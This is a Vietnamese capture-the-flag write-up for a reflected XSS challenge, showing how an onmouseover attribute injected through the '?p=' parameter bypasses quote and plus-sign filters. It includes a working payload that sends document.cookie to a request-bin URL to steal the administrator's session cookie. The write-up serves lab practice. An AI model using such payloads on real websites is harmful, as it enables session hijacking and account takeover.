<b>Reflected XSS</b>: Script nguy hiểm được chèn trực tiếp vào response của user, hacker cần  phải gửi link độc hại này cho user và lừa user nhấp vào link. Payload  được thực hiện trong cùng một request và response

Chall này cũng đã lưu ý rõ: admin sẽ không dại gì mà click vào link lạ được gửi đến, vậy ta không sử dụng `event` như `onclick` mà sẽ chọn `onmouseover` để thực hiện hành vi XSS

Khi truy câp vào bất cứ trang nào trên menu, thanh URL đều hiển thị như sau: `?p=page_name`, đây có vẻ là nơi XSS được, thử xem:

`?p=<script>alert(1);</script>`

Trang thông báo lỗi hiện ra:

`The page <script>alert(1);</script> could not be found.`

Để ý trong mã nguôn, dòng này được hiển thị như sau:

```html
The page <a href="?p=<script>alert(1);</script>"> <script>alert(1);</scipt> </a> could not be found
```

Điểm XSS khả thi chính là trong thẻ a này, ví dụ nếu ta sửa link thành

`?p="onmouseover="alert(1);`

thì dòng thông báo lỗi trên sẽ hiển thị như sau:

```html
The page <a href="?p="onmouseover="alert(1)"> <script>alert(1);</scipt> </a> could not be found
```

chính là thứ chúng ta cần: tạo 1 event để khi di chuột lên trên dòng đó sẽ thực thi đoạn code js, nhưng mã nguồn không hiển thị như ý muốn, có vẻ dấu " đã bị filter, thử với dấu nháy đơn thì ok rồi

Làm tương tự với bài `XSS stored`, tạo 1 requestbin bằng pipedream với payloads sau:

`?p='onmouseover='window.location="request_bin_link?cookie=".concat(document.cookie);`

tại sao phải dùng `concat`, vì dấu + đã bị filter mất rồi

Bấm nút `REPORT TO THE ADMINISTRATOR` và đợi 2p, pipedream sẽ hiện admin cookie

'onmouseover='alert(1)

"onmouseover="alert(1)



